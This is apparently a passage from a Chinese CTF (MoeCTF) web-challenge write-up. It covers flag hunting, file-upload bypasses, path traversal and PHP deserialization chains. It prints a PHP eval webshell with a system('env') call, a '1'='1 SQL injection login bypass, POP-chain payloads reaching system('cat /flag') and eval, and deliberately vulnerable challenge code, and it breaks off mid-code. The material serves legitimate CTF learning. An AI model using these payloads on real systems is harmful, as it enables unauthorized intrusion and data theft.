class="line">&#123;&quot;nickname&quot;:&quot;HvAng§1§&quot;,&quot;user_gender&quot;:&quot;male&quot;,&quot;target&quot;:&quot;she&quot;,&quot;target_gender&quot;:&quot;female&quot;,&quot;message&quot;:&quot;iloveyou&quot;,&quot;anonymous&quot;:&quot;false&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="弗拉格之地的挑战"><a class="markdownIt-Anchor" href="#弗拉格之地的挑战"></a> 弗拉格之地的挑战</h2><p>第一步，查看页面源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--&gt;</span><br><span class="line">&lt;!--flag1: bW9lY3Rm--&gt;</span><br><span class="line">&lt;!--下一步：/flag2hh.php--&gt;</span><br><span class="line"></span><br><span class="line">第二步，查看响应头，抓包或者开发者工具(F12)</span><br><span class="line">flag2: e0FmdEV</span><br><span class="line">nextpage: /</span><br><span class="line"></span><br><span class="line">第三步，get post 修改cookie</span><br><span class="line">flag3: yX3RoMXN</span><br><span class="line"></span><br><span class="line">第四步，修改前端代码，id=9</span><br><span class="line">恭喜你！你已经知道，前端的一切都是可以更改的！</span><br><span class="line">flag4: fdFVUMHJ</span><br><span class="line">前往：/flag5sxr.php</span><br><span class="line"></span><br><span class="line">第五步，抓包，后端绕过</span><br><span class="line">恭喜，我相信你已经深刻了解了前端不可信任的道理!</span><br><span class="line">flag5: fSV90aDF</span><br><span class="line"></span><br><span class="line">第六步，PHP，大小写</span><br><span class="line">flag6: rZV9VX2t</span><br><span class="line"></span><br><span class="line">第七步，命令执行，system(&quot;cat /flag7&quot;);</span><br><span class="line">flag7: rbm93X1dlQn0= </span><br></pre></td></tr></table></figure><h2 id="imagecloud前置"><a class="markdownIt-Anchor" href="#imagecloud前置"></a> ImageCloud前置</h2><p>PHP伪协议，<code>file:///etc/passwd</code></p><h2 id="垫刀之路02-普通的文件上传"><a class="markdownIt-Anchor" href="#垫刀之路02-普通的文件上传"></a> 垫刀之路02: 普通的文件上传</h2><p>没有任何过滤的文件上传，<code>a.php</code><br /><code>&lt;?php eval($_GET['1']);?&gt;</code>，既然<code>/flag.sh</code>读不了，那看看环境变量，<code>/uploads/a.php?1=system(&quot;env&quot;);</code></p><h2 id="垫刀之路03-这是一个图床"><a class="markdownIt-Anchor" href="#垫刀之路03-这是一个图床"></a> 垫刀之路03: 这是一个图床</h2><p>只能上传 <code>jpg/png/gif</code> 格式的图片哦<br />上传符合格式的，抓包修改为<code>.php</code><br />可以上传这样一个<code>a.jpg</code>，内容为<code>&lt;?php phpinfo();?&gt;</code><br /><code>/uploads/a.php</code>，<code>Ctrl f</code>寻找<code>moe</code></p><h2 id="垫刀之路04-一个文件浏览器"><a class="markdownIt-Anchor" href="#垫刀之路04-一个文件浏览器"></a> 垫刀之路04: 一个文件浏览器</h2><p>目录穿越<br /><code>../../../../../../../../../tmp/flag</code></p><h2 id="垫刀之路05-登陆网站"><a class="markdownIt-Anchor" href="#垫刀之路05-登陆网站"></a> 垫刀之路05: 登陆网站</h2><p>听说管理员叫 <code>admin123</code>，账号有了，先试试万能密码<br /><code>admin123' or '1'='1</code></p><h2 id="垫刀之路06-pop-base-mini-moe"><a class="markdownIt-Anchor" href="#垫刀之路06-pop-base-mini-moe"></a> 垫刀之路06: pop base mini moe</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 注意 private 属性的序列化哦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如何赋值呢</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable language_">$this</span>-&gt;evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>一道前置题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 注意 private 属性的序列化哦</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如何赋值呢</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable language_">$this</span>-&gt;evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><h2 id="垫刀之路07-泄漏的密码"><a class="markdownIt-Anchor" href="#垫刀之路07-泄漏的密码"></a> 垫刀之路07: 泄漏的密码</h2><p><code>url/console</code>，进入控制台</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;import os</span><br><span class="line">&gt;&gt;os.popen(<span class="string">&quot;ls&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&gt;&gt;os.popen(<span class="string">&quot;cat flag&quot;</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><h2 id="静态网页"><a class="markdownIt-Anchor" href="#静态网页"></a> 静态网页()</h2><p><img src="https://picx.zhimg.com/80/v2-e62fd735fe276370d98b7542f906c453_1440w.png?source=d16d100b" alt="" /><br />访问<code>final1l1l_challenge.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;final1l1l_challenge.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="variable">$b</span>[<span class="variable">$a</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;noooooooooooo&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>( <span class="string">&#x27;Notice the param type!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>( <span class="string">&#x27;Where is your param?&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>芜湖，做到这，思路有点卡住了，然后好像去打某某比赛了，后面再补上吧(maybe)</p><h2 id="电院_backend"><a class="markdownIt-Anchor" href="#电院_backend"></a> 电院_Backend()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>)&#123;</span><br><span class="line">    <span class="variable">$verify_code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;verify_code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证验证码</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$verify_code</span>) || <span class="variable">$verify_code</span> !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;验证码错误啦，再输入吧&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/&quot;</span>, <span class="variable">$email</span>)||<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or/i&quot;</span>, <span class="variable">$email</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;不存在邮箱为： &#x27;</span>.<span class="variable">$email</span>.<span class="string">&#x27; 的管理员账号！&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pwd</span>);</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;xdsec&quot;</span>,<span class="number">3306</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE email=&#x27;<span class="subst">$email</span>&#x27; AND pwd=&#x27;<span class="subst">$pwd</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_email&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;登陆成功，moectf&#123;testflag&#125;&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;管理员邮箱或密码错误&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="pop-moe"><a class="markdownIt-Anchor" href="#pop-moe"></a> pop moe</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$payl0ad</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;payl0ad === <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;FAILED TO ATTACK&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;what;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;payload = <span class="variable language_">$this</span>-&gt;payl0ad;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dangerous</span>(<span class="params"><span class="variable">$whaattt</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whaattt</span>-&gt;<span class="title function_ invoke__">evvval</span>(<span class="variable">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evvval</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mystr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-7cac117389557ba335fe0ee1073c4a01_1440w.png" alt="" /></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;payl0ad === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;FAILED TO ATTACK&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;what;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span> = <span class="string">&quot;dangerous&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;payload = <span class="variable language_">$this</span>-&gt;payl0ad;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dangerous</span>(<span class="params"><span class="variable">$whaattt</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whaattt</span>-&gt;<span class="title function_ invoke__">evvval</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evvval</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mystr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class000</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;what = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;what-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">class002</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;what-&gt;a-&gt;sec = <span class="keyword">new</span> <span class="title function_ invoke__">class003</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;what-&gt;a-&gt;sec-&gt;mystr=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><p>有点小卡的地方可能会是，<code>class003</code>的<code>evvval</code>触发<code>__tostring</code></p><h2 id="勇闯铜人阵"><a class="markdownIt-Anchor" href="#勇闯铜人阵"></a> 勇闯铜人阵()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:50886/&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&quot;1&quot;</span>: <span class="string">&quot;北方&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2&quot;</span>: <span class="string">&quot;东北方&quot;</span>,</span><br><span class="line">        <span class="string">&quot;3&quot;</span>: <span class="string">&quot;东方&quot;</span>,</span><br><span class="line">        <span class="string">&quot;4&quot;</span>: <span class="string">&quot;东南方&quot;</span>,</span><br><span class="line">        <span class="string">&quot;5&quot;</span>: <span class="string">&quot;南方&quot;</span>,</span><br><span class="line">        <span class="string">&quot;6&quot;</span>: <span class="string">&quot;西南方&quot;</span>,</span><br><span class="line">        <span class="string">&quot;7&quot;</span>: <span class="string">&quot;西方&quot;</span>,</span><br><span class="line">        <span class="string">&quot;8&quot;</span>: <span class="string">&quot;西北方&quot;</span>&#125;</span><br><span class="line">res = requests.post(url, data=&#123;<span class="string">&quot;player&quot;</span>: <span class="string">&quot;北方&quot;</span>, <span class="string">&quot;direct&quot;</span>: <span class="string">&quot;弟子明白&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    soup = BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    status_element = soup.find(<span class="built_in">id</span>=<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    status_text = status_element.get_text() <span class="keyword">if</span> status_element <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    numbers = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, status_text)</span><br><span class="line">    numbers = [<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> numbers]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(numbers) == <span class="number">1</span>:</span><br><span class="line">        a = <span class="built_in">dict</span>[<span class="built_in">str</span>(numbers[<span class="number">0</span>])]</span><br><span class="line">        res = requests.post(</span><br><span class="line">            url, data=&#123;<span class="string">&quot;player&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;a&#125;</span>&quot;</span>, <span class="string">&quot;direct&quot;</span>: <span class="string">&quot;弟子明白&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a = <span class="built_in">dict</span>[<span class="built_in">str</span>(numbers[<span class="number">0</span>])]</span><br><span class="line">        b = <span class="built_in">dict</span>[<span class="built_in">str</span>(numbers[<span class="number">1</span>])]</span><br><span class="line">        res = requests.post(</span><br><span class="line">            url, data=&#123;<span class="string">&quot;player&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;a&#125;</span>一个，<span class="subst">&#123;b&#125;</span>一个&quot;</span>, <span class="string">&quot;direct&quot;</span>: <span class="string">&quot;弟子明白&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">30</span>)</span><br><span class="line">res = requests.post(url, data=&#123;<span class="string">&quot;player&quot;</span>: <span class="string">&quot;北方&quot;</span>, <span class="string">&quot;direct&quot;</span>: <span class="string">&quot;弟子明白&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>脚本不对，没有达到模拟鼠标点击的效果？方向应该没有问题，后面没时间再来看了</p><h2 id="whos-blog"><a class="markdownIt-Anchor" href="#whos-blog"></a> who’s blog?()</h2><p>卡住，有事，润</p><h2 id="petstore"><a class="markdownIt-Anchor" href="#petstore"></a> PetStore()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template, redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, species</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.name = name</span><br><span class="line">        self.species = species</span><br><span class="line">        self.uuid = uuid.uuid4()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; 